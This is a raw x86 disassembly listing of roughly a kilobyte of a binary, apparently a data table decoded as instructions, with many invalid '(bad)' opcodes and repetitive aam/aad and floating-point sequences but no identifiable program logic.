  40bb75:	1b d1                	sbb    %ecx,%edx
  40bb77:	43                   	inc    %ebx
  40bb78:	d1 4a d1             	rorl   $1,-0x2f(%edx)
  40bb7b:	62 d2 84 d2 bd       	(bad)
  40bb80:	d2 c5                	rol    %cl,%ch
  40bb82:	d2 d1                	rcl    %cl,%cl
  40bb84:	d2 0b                	rorb   %cl,(%ebx)
  40bb86:	d2 11                	rclb   %cl,(%ecx)
  40bb88:	d2 22                	shlb   %cl,(%edx)
  40bb8a:	d2 31                	shlb   %cl,(%ecx)
  40bb8c:	d2 37                	shlb   %cl,(%edi)
  40bb8e:	d2 45 d2             	rolb   %cl,-0x2e(%ebp)
  40bb91:	55                   	push   %ebp
  40bb92:	d2 68 d3             	shrb   %cl,-0x2d(%eax)
  40bb95:	74 d3                	je     0x40bb6a
  40bb97:	84 d3                	test   %dl,%bl
  40bb99:	8a d3                	mov    %bl,%dl
  40bb9b:	90                   	nop
  40bb9c:	d3 96 d3 9b d3 a1    	rcll   %cl,-0x5e2c642d(%esi)
  40bba2:	d3 aa d3 ba d3 bf    	shrl   %cl,-0x402c452d(%edx)
  40bba8:	d3 c4                	rol    %cl,%esp
  40bbaa:	d3 c9                	ror    %cl,%ecx
  40bbac:	d3 ce                	ror    %cl,%esi
  40bbae:	d3 dc                	rcr    %cl,%esp
  40bbb0:	d3 e6                	shl    %cl,%esi
  40bbb2:	d3 11                	rcll   %cl,(%ecx)
  40bbb4:	d3 1a                	rcrl   %cl,(%edx)
  40bbb6:	d3 21                	shll   %cl,(%ecx)
  40bbb8:	d3 3c d3             	sarl   %cl,(%ebx,%edx,8)
  40bbbb:	46                   	inc    %esi
  40bbbc:	d3 6d d4             	shrl   %cl,-0x2c(%ebp)
  40bbbf:	72 d4                	jb     0x40bb95
  40bbc1:	77 d4                	ja     0x40bb97
  40bbc3:	99                   	cltd
  40bbc4:	d4 a2                	aam    $0xa2
  40bbc6:	d4 b8                	aam    $0xb8
  40bbc8:	d4 d0                	aam    $0xd0
  40bbca:	d4 eb                	aam    $0xeb
  40bbcc:	d4 0a                	aam    $0xa
  40bbce:	d4 13                	aam    $0x13
  40bbd0:	d4 39                	aam    $0x39
  40bbd2:	d4 46                	aam    $0x46
  40bbd4:	d4 cf                	aam    $0xcf
  40bbd6:	d8 fd                	fdivr  %st(5),%st
  40bbd8:	db 07                	fildl  (%edi)
  40bbda:	db b5 de be de c9    	(bad) -0x36214122(%ebp)
  40bbe0:	de ce                	fmulp  %st,%st(6)
  40bbe2:	de d6                	(bad)
  40bbe4:	de de                	(bad)
  40bbe6:	de 60 a0             	fisubs -0x60(%eax)
  40bbe9:	60                   	pusha
  40bbea:	d0 60 a0             	shlb   $1,-0x60(%eax)
  40bbed:	5c                   	pop    %esp
  40bbee:	a0 60 a0 22 d0       	mov    0xd022a060,%al
  40bbf3:	29 d0                	sub    %edx,%eax
  40bbf5:	36 d0 9b d1 a7 d1 af 	rcrb   $1,%ss:-0x502e582f(%ebx)
  40bbfc:	d1 b5 d1 c2 d1 d2    	shll   $1,-0x2d2e3d2f(%ebp)
  40bc02:	d1 df                	rcr    $1,%edi
  40bc04:	d1 e5                	shl    $1,%ebp
  40bc06:	d1 e9                	shr    $1,%ecx
  40bc08:	d1 f0                	shl    $1,%eax
  40bc0a:	d1 f9                	sar    $1,%ecx
  40bc0c:	d1 02                	roll   $1,(%edx)
  40bc0e:	d1 13                	rcll   $1,(%ebx)
  40bc10:	d1 72 d2             	shll   $1,-0x2e(%edx)
  40bc13:	9c                   	pushf
  40bc14:	d2 b7 d2 c1 d2 cc    	shlb   %cl,-0x332d3e2e(%edi)
  40bc1a:	d2 df                	rcr    %cl,%bh
  40bc1c:	d2 e7                	shl    %cl,%bh
  40bc1e:	d2 0c d2             	rorb   %cl,(%edx,%edx,8)
  40bc21:	14 d2                	adc    $0xd2,%al
  40bc23:	22 d2                	and    %dl,%dl
  40bc25:	27                   	daa
  40bc26:	d2 40 d2             	rolb   %cl,-0x2e(%eax)
  40bc29:	50                   	push   %eax
  40bc2a:	d2 61 d3             	shlb   %cl,-0x2d(%ecx)
  40bc2d:	6d                   	insl   (%dx),%es:(%edi)
  40bc2e:	d3 7b d3             	sarl   %cl,-0x2d(%ebx)
  40bc31:	85 d3                	test   %edx,%ebx
  40bc33:	a3 d3 a8 d3 bb       	mov    %eax,0xbbd3a8d3
  40bc38:	d3 c7                	rol    %cl,%edi
  40bc3a:	d3 ce                	ror    %cl,%esi
  40bc3c:	d3 e0                	shl    %cl,%eax
  40bc3e:	d3 f2                	shl    %cl,%edx
  40bc40:	d3 ff                	sar    %cl,%edi
  40bc42:	d3 0b                	rorl   %cl,(%ebx)
  40bc44:	d3 18                	rcrl   %cl,(%eax)
  40bc46:	d3 2a                	shrl   %cl,(%edx)
  40bc48:	d3 32                	shll   %cl,(%edx)
  40bc4a:	d3 3a                	sarl   %cl,(%edx)
  40bc4c:	d3 42 d3             	roll   %cl,-0x2d(%edx)
  40bc4f:	4a                   	dec    %edx
  40bc50:	d3 52 d3             	rcll   %cl,-0x2d(%edx)
  40bc53:	5a                   	pop    %edx
  40bc54:	d3 62 d4             	shll   %cl,-0x2c(%edx)
  40bc57:	6a d4                	push   $0xffffffd4
  40bc59:	72 d4                	jb     0x40bc2f
  40bc5b:	7a d4                	jp     0x40bc31
  40bc5d:	a2 d4 aa d4 b2       	mov    %al,0xb2d4aad4
  40bc62:	d4 ba                	aam    $0xba
  40bc64:	d4 c2                	aam    $0xc2
  40bc66:	d4 ca                	aam    $0xca
  40bc68:	d4 d2                	aam    $0xd2
  40bc6a:	d4 da                	aam    $0xda
  40bc6c:	d4 e2                	aam    $0xe2
  40bc6e:	d4 ea                	aam    $0xea
  40bc70:	d4 f2                	aam    $0xf2
  40bc72:	d4 fa                	aam    $0xfa
  40bc74:	d4 02                	aam    $0x2
  40bc76:	d4 0a                	aam    $0xa
  40bc78:	d4 12                	aam    $0x12
  40bc7a:	d4 1a                	aam    $0x1a
  40bc7c:	d4 22                	aam    $0x22
  40bc7e:	d4 2a                	aam    $0x2a
  40bc80:	d4 32                	aam    $0x32
  40bc82:	d4 3a                	aam    $0x3a
  40bc84:	d4 42                	aam    $0x42
  40bc86:	d4 4f                	aam    $0x4f
  40bc88:	d4 5b                	aam    $0x5b
  40bc8a:	d4 68                	aam    $0x68
  40bc8c:	d5 7a                	aad    $0x7a
  40bc8e:	d5 80                	aad    $0x80
  40bc90:	d5 8c                	aad    $0x8c
  40bc92:	d5 94                	aad    $0x94
  40bc94:	d5 a4                	aad    $0xa4
  40bc96:	d5 b0                	aad    $0xb0
  40bc98:	d5 c4                	aad    $0xc4
  40bc9a:	d5 cc                	aad    $0xcc
  40bc9c:	d5 d0                	aad    $0xd0
  40bc9e:	d5 d4                	aad    $0xd4
  40bca0:	d5 d8                	aad    $0xd8
  40bca2:	d5 dc                	aad    $0xdc
  40bca4:	d5 e0                	aad    $0xe0
  40bca6:	d5 e4                	aad    $0xe4
  40bca8:	d5 e8                	aad    $0xe8
  40bcaa:	d5 ec                	aad    $0xec
  40bcac:	d5 fa                	aad    $0xfa
  40bcae:	d5 5b                	aad    $0x5b
  40bcb0:	d5 81                	aad    $0x81
  40bcb2:	d6                   	salc
  40bcb3:	c6                   	(bad)
  40bcb4:	d6                   	salc
  40bcb5:	01 d6                	add    %edx,%esi
  40bcb7:	24 d6                	and    $0xd6,%al
  40bcb9:	7c d7                	jl     0x40bc92
  40bcbb:	cf                   	iret
  40bcbc:	d7                   	xlat   %ds:(%ebx)
  40bcbd:	e8 d7 f3 d7 51       	call   0x5218b099
  40bcc2:	d7                   	xlat   %ds:(%ebx)
  40bcc3:	71 d8                	jno    0x40bc9d
  40bcc5:	b2 d8                	mov    $0xd8,%dl
  40bcc7:	e7 d8                	out    %eax,$0xd8
  40bcc9:	3e d8 b3 d9 ea d9 73 	fdivs  %ds:0x73d9ead9(%ebx)
  40bcd0:	da db                	fcmovu %st(3),%st
  40bcd2:	db 10                	fistl  (%eax)
  40bcd4:	db 86 dc 79 dd 23    	fildl  0x23dd79dc(%esi)
  40bcda:	dd 34 dd 50 dd 02 df 	fnsave -0x20fd22b0(,%ebx,8)
  40bce1:	17                   	pop    %ss
  40bce2:	df 2a                	fildll (%edx)
  40bce4:	df 60 e0             	fbld   -0x20(%eax)
  40bce7:	60                   	pusha
  40bce8:	a0 f4 a0 60 a0       	mov    0xa060a0f4,%al
  40bced:	87 d0                	xchg   %edx,%eax
  40bcef:	c7                   	(bad)
  40bcf0:	d0 d3                	rcl    $1,%bl
  40bcf2:	d0 e0                	shl    $1,%al
  40bcf4:	d0 f2                	shl    $1,%dl
  40bcf6:	d0 09                	rorb   $1,(%ecx)
  40bcf8:	d0 5e d0             	rcrb   $1,-0x30(%esi)
  40bcfb:	8b d1                	mov    %ecx,%edx
  40bcfd:	c6                   	(bad)
  40bcfe:	d1 f3                	shl    $1,%ebx
  40bd00:	d1 2d d1 68 d2 95    	shrl   $1,0x95d268d1
  40bd06:	d2 cf                	ror    %cl,%bh
  40bd08:	d2 09                	rorb   %cl,(%ecx)
  40bd0a:	d2 57 d2             	rclb   %cl,-0x2e(%edi)
  40bd0d:	83 d3 8f             	adc    $0xffffff8f,%ebx
  40bd10:	d3 cd                	ror    %cl,%ebp
  40bd12:	d3 d9                	rcr    %cl,%ecx
  40bd14:	d3 ea                	shr    %cl,%edx
  40bd16:	d3 25 d3 31 d3 42    	shll   %cl,0x42d331d3
  40bd1c:	d3 53 d3             	rcll   %cl,-0x2d(%ebx)
  40bd1f:	b3 d4                	mov    $0xd4,%bl
  40bd21:	1c d4                	sbb    $0xd4,%al
  40bd23:	50                   	push   %eax
  40bd24:	d4 5e                	aam    $0x5e
  40bd26:	d4 db                	aam    $0xdb
  40bd28:	d5 0d                	aad    $0xd
  40bd2a:	d5 a5                	aad    $0xa5
  40bd2c:	d6                   	salc
  40bd2d:	3e d6                	ds salc
  40bd2f:	67 d7                	xlat   %ds:(%bx)
  40bd31:	96                   	xchg   %eax,%esi
  40bd32:	d7                   	xlat   %ds:(%ebx)
  40bd33:	bf d7 00 d7 16       	mov    $0x16d700d7,%edi
  40bd38:	d7                   	xlat   %ds:(%ebx)
  40bd39:	60                   	pusha
  40bd3a:	d8 79 d8             	fdivrs -0x28(%ecx)
  40bd3d:	da d8                	fcmovu %st(0),%st
  40bd3f:	ef                   	out    %eax,(%dx)
  40bd40:	d8 1b                	fcomps (%ebx)
  40bd42:	d8 96 d9 b2 d9 21    	fcoms  0x21d9b2d9(%esi)
  40bd48:	d9 98 da 00 da 3f    	fstps  0x3fda00da(%eax)
  40bd4e:	da 8a db 2b db 9a    	fimull -0x6524d425(%edx)
  40bd54:	dc d4                	(bad)
  40bd56:	dc f7                	fdiv   %st,%st(7)
  40bd58:	dc 7d dd             	fdivrl -0x23(%ebp)
  40bd5b:	a9 dd 0d dd 8e       	test   $0x8edd0ddd,%eax
  40bd60:	de 13                	ficoms (%ebx)
  40bd62:	de 1f                	ficomps (%edi)
  40bd64:	de 2c de             	fisubrs (%esi,%ebx,8)
  40bd67:	3e de 46 de          	fiadds %ds:-0x22(%esi)
  40bd6b:	4c                   	dec    %esp
  40bd6c:	de 5c de 74          	ficomps 0x74(%esi,%ebx,8)
  40bd70:	df 91 df 08 df 2f    	fists  0x2fdf08df(%ecx)
  40bd76:	df 60 a0             	fbld   -0x60(%eax)
  40bd79:	60                   	pusha
  40bd7a:	f0 60                	lock pusha
  40bd7c:	a0 f4 a0 60 a0       	mov    0xa060a0f4,%al
  40bd81:	6d                   	insl   (%dx),%es:(%edi)
  40bd82:	d0 af d0 f7 d0 29    	shrb   $1,0x29d0f7d0(%edi)
  40bd88:	d0 71 d1             	shlb   $1,-0x2f(%ecx)
  40bd8b:	bf d1 0f d1 51       	mov    $0x51d10fd1,%edi
  40bd90:	d1 76 d4             	shll   $1,-0x2c(%esi)
  40bd93:	83 d4 90             	adc    $0xffffff90,%esp
  40bd96:	d4 9f                	aam    $0x9f
  40bd98:	d4 af                	aam    $0xaf
  40bd9a:	d4 ba                	aam    $0xba
  40bd9c:	d4 c7                	aam    $0xc7
  40bd9e:	d4 cc                	aam    $0xcc
  40bda0:	d4 78                	aam    $0x78
  40bda2:	d5 ff                	aad    $0xff
  40bda4:	d6                   	salc
  40bda5:	24 d6                	and    $0xd6,%al
  40bda7:	40                   	inc    %eax
  40bda8:	d6                   	salc
  40bda9:	b0 d7                	mov    $0xd7,%al
  40bdab:	08 d7                	or     %dl,%bh
  40bdad:	20 d7                	and    %dl,%bh
  40bdaf:	b7 d8                	mov    $0xd8,%bh
  40bdb1:	37                   	aaa
  40bdb2:	d8 43 d8             	fadds  -0x28(%ebx)
  40bdb5:	50                   	push   %eax
  40bdb6:	d8 62 d9             	fsubs  -0x27(%edx)
  40bdb9:	6a d9                	push   $0xffffffd9
  40bdbb:	72 d9                	jb     0x40bd96
  40bdbd:	7f d9                	jg     0x40bd98
  40bdbf:	8b d9                	mov    %ecx,%ebx
  40bdc1:	98                   	cwtl
  40bdc2:	d9 aa d9 b2 d9 ba    	fldcw  -0x45264d27(%edx)
  40bdc8:	d9 c2                	fld    %st(2)
  40bdca:	d9 ca                	fxch   %st(2)
  40bdcc:	d9 d7                	(bad)
  40bdce:	d9 e3                	(bad)
  40bdd0:	d9 f0                	f2xm1
  40bdd2:	d9 02                	flds   (%edx)
  40bdd4:	d9 53 d9             	fsts   -0x27(%ebx)
  40bdd7:	68 da e6 da 03       	push   $0x3dae6da
  40bddc:	da 20                	fisubl (%eax)
  40bdde:	da 65 db             	fisubl -0x25(%ebp)
  40bde1:	b9 db cf db e5       	mov    $0xe5dbcfdb,%ecx
  40bde6:	db 0b                	fisttpl (%ebx)
  40bde8:	db 02                	fildl  (%edx)
  40bdea:	dc 67 dd             	fsubl  -0x23(%edi)
  40bded:	73 dd                	jae    0x40bdcc
  40bdef:	80 dd 92             	sbb    $0x92,%ch
  40bdf2:	dd b1 dd ef dd 13    	fnsave 0x13ddefdd(%ecx)
  40bdf8:	dd 1f                	fstpl  (%edi)
  40bdfa:	dd 2c dd 3e dd de de 	(bad) -0x212122c2(,%ebx,8)
  40be01:	45                   	inc    %ebp
  40be02:	de 5b de             	ficomps -0x22(%ebx)
  40be05:	9d                   	popf
  40be06:	df d8                	(bad)
  40be08:	df 17                	fists  (%edi)
  40be0a:	df 3c df             	fistpll (%edi,%ebx,8)
  40be0d:	60                   	pusha
  40be0e:	00 60 a0             	add    %ah,-0x60(%eax)
  40be11:	b8 a1 60 a0 68       	mov    $0x68a060a1,%eax
  40be16:	d0 8c d0 b8 d0 e6 d0 	rorb   $1,-0x2f192f48(%eax,%edx,8)
  40be1d:	0b d0                	or     %eax,%edx
  40be1f:	30 d0                	xor    %dl,%al
  40be21:	6b d1 8b             	imul   $0xffffff8b,%ecx,%edx
  40be24:	d1 aa d1 da d1 4b    	shrl   $1,0x4bd1dad1(%edx)
  40be2a:	d1 26                	shll   $1,(%esi)
  40be2c:	d3 3b                	sarl   %cl,(%ebx)
  40be2e:	d3 9f d4 e0 d4 f5    	rcrl   %cl,-0xa2b1f2c(%edi)
  40be34:	d4 14                	aam    $0x14
  40be36:	d4 6e                	aam    $0x6e
  40be38:	d5 be                	aad    $0xbe
  40be3a:	d5 f5                	aad    $0xf5
  40be3c:	d5 28                	aad    $0x28
  40be3e:	d5 50                	aad    $0x50
  40be40:	d5 82                	aad    $0x82
  40be42:	d6                   	salc
  40be43:	ce                   	into
  40be44:	d6                   	salc
  40be45:	f5                   	cmc
  40be46:	d6                   	salc
  40be47:	4f                   	dec    %edi
  40be48:	d6                   	salc
  40be49:	5b                   	pop    %ebx
  40be4a:	d6                   	salc
  40be4b:	68 d7 7a d7 82       	push   $0x82d77ad7
  40be50:	d7                   	xlat   %ds:(%ebx)
  40be51:	88 d7                	mov    %dl,%bh
  40be53:	91                   	xchg   %eax,%ecx
  40be54:	d7                   	xlat   %ds:(%ebx)
  40be55:	96                   	xchg   %eax,%esi
  40be56:	d7                   	xlat   %ds:(%ebx)
  40be57:	9c                   	pushf
  40be58:	d7                   	xlat   %ds:(%ebx)
  40be59:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40be5a:	d7                   	xlat   %ds:(%ebx)
  40be5b:	ae                   	scas   %es:(%edi),%al
  40be5c:	d7                   	xlat   %ds:(%ebx)
  40be5d:	b4 d7                	mov    $0xd7,%ah
  40be5f:	bd d7 c2 d7 c8       	mov    $0xc8d7c2d7,%ebp
  40be64:	d7                   	xlat   %ds:(%ebx)
  40be65:	d0 d7                	rcl    $1,%bh
  40be67:	db d7                	fcmovnbe %st(7),%st
  40be69:	e0 d7                	loopne 0x40be42
  40be6b:	1b d7                	sbb    %edi,%edx
  40be6d:	20 d7                	and    %dl,%bh
  40be6f:	62                   	(bad)
  40be70:	d8 67 d8             	fsubs  -0x28(%edi)
  40be73:	6c                   	insb   (%dx),%es:(%edi)
  40be74:	d8 9e d8 a9 d8 b4    	fcomps -0x4b275628(%esi)
  40be7a:	d8 bc d8 c4 d8 cc d8 	fdivrs -0x2733273c(%eax,%ebx,8)
  40be81:	df d8                	(bad)
  40be83:	e8 d8 00 d8 05       	call   0x618bf60
  40be88:	d8 20                	fsubs  (%eax)
  40be8a:	d8 2b                	fsubrs (%ebx)
  40be8c:	d8 4b d8             	fmuls  -0x28(%ebx)
  40be8f:	56                   	push   %esi
  40be90:	d8 61 d9             	fsubs  -0x27(%ecx)
  40be93:	72 d9                	jb     0x40be6e
  40be95:	8e d9                	mov    %ecx,%ds
  40be97:	98                   	cwtl
  40be98:	d9 a8 d9 b6 d9 c0    	fldcw  -0x3f264927(%eax)
  40be9e:	d9 d0                	fnop
  40bea0:	d9 e7                	(bad)
  40bea2:	d9 f5                	fprem1
  40bea4:	d9 07                	flds   (%edi)
  40bea6:	d9 22                	fldenv (%edx)
  40bea8:	d9 3d d9 85 da 90    	fnstcw 0x90da85d9
  40beae:	da a2 da ad da b8    	fisubl -0x47255226(%edx)
  40beb4:	da c3                	fcmovb %st(3),%st
  40beb6:	da d5                	fcmovbe %st(5),%st
  40beb8:	da e0                	(bad)
  40beba:	da ed                	(bad)
  40bebc:	da 04 da             	fiaddl (%edx,%ebx,8)
  40bebf:	22 da                	and    %dl,%bl
  40bec1:	52                   	push   %edx
  40bec2:	da 5c da 9d          	ficompl -0x63(%edx,%ebx,8)
  40bec6:	db a7 db b1 db bb    	(bad) -0x44244e25(%edi)
  40becc:	db c1                	fcmovnb %st(1),%st
  40bece:	db d2                	fcmovnbe %st(2),%st
  40bed0:	db 0b                	fisttpl (%ebx)
  40bed2:	db 56 db             	fistl  -0x25(%esi)
  40bed5:	66 dc 80 dc 97 dc 9c 	data16 faddl -0x63236824(%eax)
  40bedc:	dc a9 dc b6 dc c1    	fsubrl -0x3e234924(%ecx)
  40bee2:	dc cb                	fmul   %st,%st(3)
  40bee4:	dc db                	(bad)
  40bee6:	dc e5                	fsub   %st,%st(5)
  40bee8:	dc ef                	fsubr  %st,%st(7)
  40beea:	dc fa                	fdivr  %st,%st(2)
  40beec:	dc 04 dc             	faddl  (%esp,%ebx,8)
  40beef:	13 dc                	adc    %esp,%ebx
  40bef1:	1a dc                	sbb    %ah,%bl
  40bef3:	25 dc 32 dc 38       	and    $0x38dc32dc,%eax
  40bef8:	dc 3d dc 4a dc 51    	fdivrl 0x51dc4adc
  40befe:	dc 59 dc             	fcompl -0x24(%ecx)
  40bf01:	68 dd 6d dd 77       	push   $0x77dd6ddd
  40bf06:	dd 82 dd 8b dd 91    	fldl   -0x6e227423(%edx)
  40bf0c:	dd 9b dd a1 dd a8    	fstpl  -0x57225e23(%ebx)
  40bf12:	dd be dd c4 dd ca    	fnstsw -0x35223b23(%esi)
  40bf18:	dd d0                	fst    %st(0)
  40bf1a:	dd d4                	fst    %st(4)
  40bf1c:	dd da                	fstp   %st(2)
  40bf1e:	dd de                	fstp   %st(6)
  40bf20:	dd e4                	fucom  %st(4)
  40bf22:	dd ef                	fucomp %st(7)
  40bf24:	dd f5                	(bad)
  40bf26:	dd f9                	(bad)
  40bf28:	dd ff                	(bad)
  40bf2a:	dd 03                	fldl   (%ebx)
  40bf2c:	dd 09                	fisttpll (%ecx)
  40bf2e:	dd 12                	fstl   (%edx)
  40bf30:	dd 20                	frstor (%eax)
  40bf32:	dd 2a                	(bad) (%edx)
  40bf34:	dd 35 dd 3c dd 43    	fnsave 0x43dd3cdd
  40bf3a:	dd 4a dd             	fisttpll -0x23(%edx)
  40bf3d:	51                   	push   %ecx
  40bf3e:	dd 59 dd             	fstpl  -0x23(%ecx)
  40bf41:	61                   	popa
  40bf42:	de 6a de             	fisubrs -0x22(%edx)
  40bf45:	9b de e7             	fsubp  %st,%st(7)
  40bf48:	de f3                	fdivp  %st,%st(3)
  40bf4a:	de 00                	fiadds (%eax)
  40bf4c:	de 12                	ficoms (%edx)
  40bf4e:	de 38                	fidivrs (%eax)
  40bf50:	de 5e de             	ficomps -0x22(%esi)
  40bf53:	69 df db df e7 df    	imul   $0xdfe7dfdb,%edi,%ebx
  40bf59:	f4                   	hlt
  40bf5a:	df 06                	filds  (%esi)
  40bf5c:	df 0c df             	fisttps (%edi,%ebx,8)
  40bf5f:	34 df                	xor    $0xdf,%al
  40bf61:	4e                   	dec    %esi
  40bf62:	df 60 a0             	fbld   -0x60(%eax)
  40bf65:	60                   	pusha
  40bf66:	10 60 a0             	adc    %ah,-0x60(%eax)
  40bf69:	c4 a0 60 a0 6b d0    	les    -0x2f945fa0(%eax),%esp
  40bf6f:	ea d0 00 d0 1e d0 6c 	ljmp   $0x6cd0,$0x1ed000d0
  40bf76:	d1 25 d1 41 d1 f0    	shll   $1,0xf0d141d1
  40bf7c:	d2 8d d3 db d3 fd    	rorb   %cl,-0x22c242d(%ebp)
  40bf82:	d3 1a                	rcrl   %cl,(%edx)
  40bf84:	d3 33                	shll   %cl,(%ebx)
  40bf86:	d4 67                	aam    $0x67
  40bf88:	d5 73                	aad    $0x73
  40bf8a:	d5 80                	aad    $0x80
  40bf8c:	d5 92                	aad    $0x92
  40bf8e:	d5 7a                	aad    $0x7a
  40bf90:	d6                   	salc
  40bf91:	90                   	nop
  40bf92:	d6                   	salc
  40bf93:	a2 d6 cd d6 21       	mov    %al,0x21d6cdd6
  40bf98:	d6                   	salc
  40bf99:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40bf9a:	d7                   	xlat   %ds:(%ebx)
  40bf9b:	b6 d8                	mov    $0xd8,%dh
  40bf9d:	d3 d8                	rcr    %cl,%eax
  40bf9f:	ef                   	out    %eax,(%dx)
  40bfa0:	d8 17                	fcoms  (%edi)
  40bfa2:	d8 8f d9 90 da a5    	fmuls  -0x5a256f27(%edi)
  40bfa8:	da 7a db             	fidivrl -0x25(%edx)
  40bfab:	b8 db c8 db dc       	mov    $0xdcdbc8db,%eax
  40bfb0:	db 85 dd b5 dd 35    	fildl  0x35ddb5dd(%ebp)
  40bfb6:	dd 49 dd             	fisttpll -0x23(%ecx)
  40bfb9:	59                   	pop    %ecx
  40bfba:	dd 6b de             	(bad) -0x22(%ebx)
  40bfbd:	0a de                	or     %dh,%bl
  40bfbf:	1b de                	sbb    %esi,%ebx
  40bfc1:	81 df 14 df 29 df    	sbb    $0xdf29df14,%edi
  40bfc7:	60                   	pusha
  40bfc8:	a0 60 20 60 a0       	mov    0xa0602060,%al
  40bfcd:	7c a1                	jl     0x40bf70
  40bfcf:	60                   	pusha
  40bfd0:	a0 8c d0 de d0       	mov    0xd0ded08c,%al
  40bfd5:	f0 d0 fe             	lock sar $1,%dh
  40bfd8:	d0 46 d0             	rolb   $1,-0x30(%esi)
  40bfdb:	9a d1 da d1 0f d1 24 	lcall  $0x24d1,$0xfd1dad1
  40bfe2:	d1 9e d2 d4 d2 d9    	rcrl   $1,-0x262d2b2e(%esi)
  40bfe8:	d2 e1                	shl    %cl,%cl
  40bfea:	d2 ef                	shr    %cl,%bh
  40bfec:	d2 12                	rclb   %cl,(%edx)
  40bfee:	d2 21                	shlb   %cl,(%ecx)
  40bff0:	d2 2f                	shrb   %cl,(%edi)
  40bff2:	d2 39                	sarb   %cl,(%ecx)
  40bff4:	d2 3f                	sarb   %cl,(%edi)
  40bff6:	d2 4b d2             	rorb   %cl,-0x2e(%ebx)
  40bff9:	53                   	push   %ebx
  40bffa:	d2 6a d3             	shrb   %cl,-0x2d(%edx)
  40bffd:	74 d3                	je     0x40bfd2
  40bfff:	5b                   	pop    %ebx
  40c000:	d3 75 d4             	shll   %cl,-0x2c(%ebp)
  40c003:	9c                   	pushf
  40c004:	d4 ab                	aam    $0xab
  40c006:	d4 b0                	aam    $0xb0
  40c008:	d4 c2                	aam    $0xc2
  40c00a:	d4 c7                	aam    $0xc7
  40c00c:	d4 d9                	aam    $0xd9
  40c00e:	d4 de                	aam    $0xde
  40c010:	d4 f0                	aam    $0xf0
  40c012:	d4 08                	aam    $0x8
  40c014:	d4 15                	aam    $0x15
  40c016:	d4 3f                	aam    $0x3f
  40c018:	d4 57                	aam    $0x57
  40c01a:	d4 8d                	aam    $0x8d
  40c01c:	d5 30                	aad    $0x30
  40c01e:	d5 3e                	aad    $0x3e
  40c020:	d5 50                	aad    $0x50
  40c022:	d5 8f                	aad    $0x8f
  40c024:	d6                   	salc
  40c025:	18 d6                	sbb    %dl,%dh
  40c027:	6f                   	outsl  %ds:(%esi),(%dx)
  40c028:	d7                   	xlat   %ds:(%ebx)
  40c029:	7d d7                	jge    0x40c002
  40c02b:	b0 d7                	mov    $0xd7,%al
  40c02d:	bd d7 ce d7 df       	mov    $0xdfd7ced7,%ebp
  40c032:	d7                   	xlat   %ds:(%ebx)
  40c033:	f8                   	clc
  40c034:	d7                   	xlat   %ds:(%ebx)
  40c035:	11 d7                	adc    %edx,%edi
  40c037:	2b d7                	sub    %edi,%edx
  40c039:	4c                   	dec    %esp
  40c03a:	d7                   	xlat   %ds:(%ebx)
  40c03b:	6b d8 94             	imul   $0xffffff94,%eax,%ebx
  40c03e:	d8 a2 d8 ac d8 d1    	fsubs  -0x2e275328(%edx)
  40c044:	d8 ec                	fsubr  %st(4),%st
  40c046:	d8 1f                	fcomps (%edi)
  40c048:	d8 8f da a1 da ca    	fmuls  -0x35255e26(%edi)
  40c04e:	da 3b                	fidivrl (%ebx)
  40c050:	da 8f db 9c db ab    	fimull -0x54246325(%edi)
  40c056:	db e0                	fneni(8087 only)
  40c058:	db ee                	fucomi %st(6),%st
  40c05a:	db f8                	(bad)
  40c05c:	db 17                	fistl  (%edi)
  40c05e:	db 8c dc 97 dc a2 dc 	fisttpl -0x235d2369(%esp,%ebx,8)
  40c065:	af                   	scas   %es:(%edi),%eax
  40c066:	dc b5 dc c0 dc d2    	fdivl  -0x2d233f24(%ebp)
  40c06c:	dc e7                	fsub   %st,%st(7)
  40c06e:	dc f4                	fdiv   %st,%st(4)
  40c070:	dc ff                	fdivr  %st,%st(7)
  40c072:	dc 16                	fcoml  (%esi)
  40c074:	dc 21                	fsubl  (%ecx)
  40c076:	dc 29                	fsubrl (%ecx)
  40c078:	dc 2f                	fsubrl (%edi)
  40c07a:	dc 47 dc             	faddl  -0x24(%edi)
  40c07d:	55                   	push   %ebp
  40c07e:	dc 62 dd             	fsubl  -0x23(%edx)
  40c081:	c5 dd e6             	(bad)
  40c084:	dd 33                	fnsave (%ebx)
  40c086:	de 3e                	fidivrs (%esi)
  40c088:	de 48 de             	fimuls -0x22(%eax)
  40c08b:	52                   	push   %edx
  40c08c:	de 5c de 66          	ficomps 0x66(%esi,%ebx,8)
  40c090:	df 70 df             	fbstp  -0x21(%eax)
  40c093:	7a df                	jp     0x40c074
  40c095:	84 df                	test   %bl,%bh
  40c097:	8e df                	mov    %edi,%ds
  40c099:	98                   	cwtl
  40c09a:	df 9e df a8 df b3    	fistps -0x4c205721(%esi)
  40c0a0:	df c5                	ffreep %st(5)
  40c0a2:	df d8                	(bad)
  40c0a4:	df dc                	(bad)
  40c0a6:	df e0                	fnstsw %ax
  40c0a8:	df e4                	(bad)
  40c0aa:	df e8                	fucomip %st(0),%st
  40c0ac:	df ec                	fucomip %st(4),%st
  40c0ae:	df f0                	fcomip %st(0),%st
  40c0b0:	df f4                	fcomip %st(4),%st
  40c0b2:	df f8                	(bad)
  40c0b4:	df fc                	(bad)
  40c0b6:	df 00                	filds  (%eax)
  40c0b8:	df 04 df             	filds  (%edi,%ebx,8)
  40c0bb:	08 df                	or     %bl,%bh
  40c0bd:	0c df                	or     $0xdf,%al
  40c0bf:	10 df                	adc    %bl,%bh
  40c0c1:	14 df                	adc    $0xdf,%al
  40c0c3:	18 df                	sbb    %bl,%bh
  40c0c5:	1c df                	sbb    $0xdf,%al
  40c0c7:	20 df                	and    %bl,%bh
  40c0c9:	24 df                	and    $0xdf,%al
  40c0cb:	28 df                	sub    %bl,%bh
  40c0cd:	2c df                	sub    $0xdf,%al
  40c0cf:	30 df                	xor    %bl,%bh
  40c0d1:	34 df                	xor    $0xdf,%al
  40c0d3:	38 df                	cmp    %bl,%bh
  40c0d5:	3c df                	cmp    $0xdf,%al
  40c0d7:	40                   	inc    %eax
  40c0d8:	df 44 df 48          	filds  0x48(%edi,%ebx,8)
  40c0dc:	df 4c df 50          	fisttps 0x50(%edi,%ebx,8)
  40c0e0:	df 58 df             	fistps -0x21(%eax)
  40c0e3:	60                   	pusha
  40c0e4:	a0 60 30 60 a0       	mov    0xa0603060,%al
  40c0e9:	70 a0                	jo     0x40c08b
  40c0eb:	60                   	pusha
  40c0ec:	a0 63 d0 70 d0       	mov    0xd070d063,%al
  40c0f1:	83 d0 60             	adc    $0x60,%eax
